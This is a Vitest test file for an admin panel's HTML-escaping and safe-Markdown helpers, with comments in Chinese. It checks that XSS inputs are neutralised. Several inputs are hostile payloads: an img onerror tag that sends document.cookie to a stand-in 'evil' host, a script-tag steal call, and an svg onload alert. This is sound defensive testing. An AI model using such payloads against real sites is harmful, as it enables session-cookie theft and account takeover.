import { describe, it, expect } from 'vitest'
import { escapeHtml, renderSafeMarkdown, renderSafeLineBreaks } from '../safeHtml'

/**
 * 管理端 XSS 防护测试。
 *
 * 与前台同源的 safeHtml 工具，但风险更高：
 * 管理后台的会话权限远大于前台，一旦在后台触发 XSS，
 * 攻击者能直接操作全站配置、查看所有用户数据。
 *
 * 这些用例对应的真实场景是 AdminExamDetailModal 的题目正文渲染。
 */
describe('escapeHtml', () => {
  it('转义全部 HTML 特殊字符', () => {
    expect(escapeHtml('<script>alert(1)</script>')).toBe('&lt;script&gt;alert(1)&lt;/script&gt;')
    expect(escapeHtml('a & b')).toBe('a &amp; b')
    expect(escapeHtml('"x"')).toBe('&quot;x&quot;')
    expect(escapeHtml("it's")).toBe('it&#39;s')
  })

  it('空值安全', () => {
    expect(escapeHtml(null)).toBe('')
    expect(escapeHtml(undefined)).toBe('')
  })
})

describe('renderSafeLineBreaks', () => {
  it('拦截题目正文里的 img onerror 载荷', () => {
    const payload = '<img src=x onerror="fetch(`//evil/`+document.cookie)">'
    const html = renderSafeLineBreaks(payload)

    expect(html).not.toContain('<img')
    expect(html).toContain('&lt;img')
  })

  it('拦截 script 标签', () => {
    const html = renderSafeLineBreaks('<script>steal()</script>')
    expect(html).not.toContain('<script')
    expect(html).toContain('&lt;script')
  })

  it('保留换行', () => {
    expect(renderSafeLineBreaks('第一行\n第二行')).toBe('第一行<br/>第二行')
  })

  it('不做 Markdown 替换', () => {
    // 题目正文不需要 Markdown，星号必须原样保留
    expect(renderSafeLineBreaks('**x**')).toBe('**x**')
  })
})

describe('renderSafeMarkdown', () => {
  it('先转义再替换，插入的标签才是活的', () => {
    const html = renderSafeMarkdown('**粗体**')
    expect(html).toBe('<strong>粗体</strong>')
  })

  it('Markdown 里藏攻击载荷仍然安全', () => {
    const html = renderSafeMarkdown('**<svg onload=alert(1)>**')
    expect(html).not.toContain('<svg')
    expect(html).toContain('&lt;svg')
  })
})
